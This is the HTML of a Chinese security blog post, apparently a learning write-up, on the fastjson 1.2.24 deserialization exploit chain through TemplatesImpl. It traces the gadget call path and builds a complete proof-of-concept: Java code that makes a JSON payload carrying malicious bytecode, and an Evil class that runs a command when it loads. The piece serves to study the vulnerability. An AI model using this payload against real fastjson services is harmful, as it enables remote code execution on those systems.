@@ -1,0 +1,319 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>fastjson之TemplatesImpl利用链 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="fastjson之TemplatesImpl利用链 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="fastjson1.2.24反序列化利用之TemplatesImpl
+可以使用@type指定反序列化的任意类，然后调用其getter/setter方法，攻击者可以在java环境中寻找能够加载恶意类的方法从而执行任意命令，下面讲解如何使用Te..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              fastjson之TemplatesImpl利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-15
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="fastjson1224反序列化利用之templatesimpl">fastjson1.2.24反序列化利用之TemplatesImpl</h1>
+<p>可以使用<code>@type</code>指定反序列化的任意类，然后调用其getter/setter方法，攻击者可以在java环境中寻找能够加载恶意类的方法从而执行任意命令，下面讲解如何使用TemplatesImpl类进行利用。</p>
+<h3 id="templatesimpl反序列化">TemplatesImpl反序列化</h3>
+<p>TemplatesImpl类位于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>实现了Serializable接口，可以进行序列化，我们分析一下其注入恶意类的过程。<br>
+首先是定位defineClass字节码的危险代码：<br>
+类TemplatesImpl有一个内部类TransletClassLoader，其defineClass()方法调用了其父类ClassLoader的defineClass()方法，可以直接加载字节码从而加载恶意类执行静态代码块中的代码。<br>
+<img src="https://1jzz.github.io/post-images/1650029544642.png" alt="" loading="lazy"><br>
+TemplatesImpl调用链：<br>
+首先其入口点为<code>getOutputProperties()</code>方法，为什么是这个方法呢，首先我们需要确定的是这个getter方法是否可以被fastjson调用，前四个情况可以很快的进行确认是没有问题的，而返回类型的需要查看一下，其返回类型为Properties类，其继承了<code>Hashtable&lt;Object,Object&gt;</code>，而<code>Hashtable&lt;Object,Object&gt;</code>实现了<code>Map&lt;K,V&gt;</code>接口，所以是符合返回类型的条件的。最后TemplatesImpl类中没有setOutputProperties方法，所以在指定转换为TemplatesImpl对象时会执行其<code>getOutputProperties()</code>方法，接着我们梳理调用链。</p>
+<ol>
+<li><code>TemplatesImpl.getOutputProperties()</code>：fastjson调用其符合条件的getter进入到的入口方法</li>
+<li><code>TemplatesImpl.newTransformer()</code>：为了进入目标方法getTransletInstance</li>
+<li><code>TemplatesImpl.getTransletInstance()</code>：为了进入目标方法defineTransletClasses</li>
+<li><code>TemplatesImpl.defineTransletClasses()</code>：为了进入目标方法defineClass</li>
+<li><code>TransletClassLoader.defineClass()</code>：为了进入目标方法defineClass</li>
+<li><code>ClassLoader.defineClass()</code>：解析字节码，加载恶意类</li>
+</ol>
+<h3 id="payload从零开始编写">payload从零开始编写</h3>
+<p>思路整理：</p>
+<ol>
+<li>@type指定转换为TemplatesImpl对象</li>
+<li>为私有字段_bytecodes赋值为base64解密的字节码(因为是byte类型，fastjson会自动进行base64解密)</li>
+<li>传入一个_outputProperties字段(_、-，会被替换为空)，从而触发其getter方法getOutputProperties，替换代码逻辑：<br>
+<img src="https://1jzz.github.io/post-images/1650029558024.png" alt="" loading="lazy"><br>
+调用链：<br>
+<img src="https://1jzz.github.io/post-images/1650029563224.png" alt="" loading="lazy"><br>
+当能找到fieldDeserializer(其中是符合条件的setter、getter方法)也就说明我们传入的字段存在符合条件的setter或者getter，将会之后被调用(我们想要调用的入口方法<code>getOutputProperties()</code>)。</li>
+<li>因为字段_bytecodes的数据类型为byte[][]，所以需要再加上一个[]代表字节码数组，而_outputProperties字段的数据类型为Properties类，就传入一个{}代表一个空的Properties对象</li>
+</ol>
+<p>于是我们就可以编写一个初具雏形的payload了(这里使用javassist获取恶意类的字节码)：</p>
+<pre><code class="language-java">public class TemplatesImplTest {
+    public static void main(String[] args) throws Exception {
+        ParserConfig config = new ParserConfig();
+        byte[] _bytecode = getByteCode();
+        String _bytecodeBase64 = Base64.getEncoder().encodeToString(_bytecode);
+        String json = &quot;{\n&quot; +
+                &quot;    \&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +
+                &quot;    \&quot;_bytecodes\&quot;:[\&quot;&quot; + _bytecodeBase64 + &quot;\&quot;],\n&quot; +
+                &quot;    \&quot;_outputProperties\&quot;:{}\n&quot; +
+                &quot;}&quot;;
+        System.out.println(json);
+        Object object = JSON.parseObject(json, Object.class, config, Feature.SupportNonPublicField);
+    }
+
+    public static byte[] getByteCode() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+        return clazz.toBytecode();
+    }
+}
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1650029570093.png" alt="" loading="lazy"><br>
+可以看到，在处理outputProperties的时候抛出了异常，为什么会抛出异常呢？我们在代码中寻找答案。</p>
+<ol>
+<li>首先在<code>TemplatesImpl.getTransletInstance()</code>方法中就已经偏离了我们的预期，因为_name未被赋值，从而导致直接返回而并没有执行接下来的defineTransletClasses()方法<br>
+<img src="https://1jzz.github.io/post-images/1650029575873.png" alt="" loading="lazy"><br>
+所以我们需要随便对_name字段赋一个值(注意顺序，赋值的字段应该在_outputProperties字段前，因为需要在调用getOutputProperties方法前将值赋上)。</li>
+<li>接下来我们接着运行，但还是抛出了异常，我们来看看是在那里抛出的异常<br>
+<img src="https://1jzz.github.io/post-images/1650029580656.png" alt="" loading="lazy"><br>
+可以看到_tfactory字段为null，但是确调用了其getExternalExtensionsMap()方法，所以java抛出了一个NullPointerException异常(空指针，引用本身为空)</li>
+<li>字段_tfactory为一个TransformerFactoryImpl对象，所以这里我们传入一个{}，代表一个空的TransformerFactoryImpl对象</li>
+<li>接下来我们接着运行，依旧抛出异常，需要接着调试<br>
+加载了恶意类之后的判断逻辑：<br>
+<img src="https://1jzz.github.io/post-images/1650029585992.png" alt="" loading="lazy"><br>
+可以看到，我们的恶意类其实已经被加载了，但是对恶意类Evil的父类进行了个判断，如果等于常量<code>ABSTRACT_TRANSLET</code>也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的话就正常运行，否则就抛出异常，所以我们只需要继承以下这个类就行了。</li>
+<li>接下来我们接着运行，发现已经加载了恶意类，执行了命令<br>
+<img src="https://1jzz.github.io/post-images/1650029590317.png" alt="" loading="lazy"></li>
+</ol>
+<h4 id="payload">payload</h4>
+<pre><code class="language-java">public class TemplatesImplTest {
+    public static void main(String[] args) throws Exception {
+        ParserConfig config = new ParserConfig();
+        byte[] _bytecode = getByteCode();
+        String _bytecodeBase64 = Base64.getEncoder().encodeToString(_bytecode);
+        String json = &quot;{\n&quot; +
+                &quot;    \&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +
+                &quot;    \&quot;_bytecodes\&quot;:[\&quot;&quot; + _bytecodeBase64 + &quot;\&quot;],\n&quot; +
+                &quot;    \&quot;_tfactory\&quot;:{},\n&quot; +
+                &quot;    \&quot;_name\&quot;:\&quot;1jzz\&quot;,\n&quot; +
+                &quot;    \&quot;_outputProperties\&quot;:{}\n&quot; +
+                &quot;}&quot;;
+        System.out.println(json);
+        Object object = JSON.parseObject(json, Object.class, config, Feature.SupportNonPublicField);
+    }
+
+    public static byte[] getByteCode() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+        return clazz.toBytecode();
+    }
+}
+
+</code></pre>
+<pre><code class="language-java">import java.io.IOException;
+
+public class Evil extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+
+</code></pre>
+<h3 id="templatesimpl利用链的优势以及劣势">TemplatesImpl利用链的优势以及劣势</h3>
+<p>优势：</p>
+<ul>
+<li>直接注入恶意类字节码从而执行命令，无需出网</li>
+</ul>
+<p>劣势：</p>
+<ul>
+<li>需要开启<code>Feature.SupportNonPublicField</code>特性，支持非public字段的，这在实际情况中很少出现</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#fastjson1224%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E4%B9%8Btemplatesimpl">fastjson1.2.24反序列化利用之TemplatesImpl</a><br>
+*
+<ul>
+<li><a href="#templatesimpl%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">TemplatesImpl反序列化</a></li>
+<li><a href="#payload%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%BC%96%E5%86%99">payload从零开始编写</a>
+<ul>
+<li><a href="#payload">payload</a></li>
+</ul>
+</li>
+<li><a href="#templatesimpl%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E4%BC%98%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%8A%A3%E5%8A%BF">TemplatesImpl利用链的优势以及劣势</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/hrJqFRmiX/">
+              <h3 class="post-title">
+                初识fastjson
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
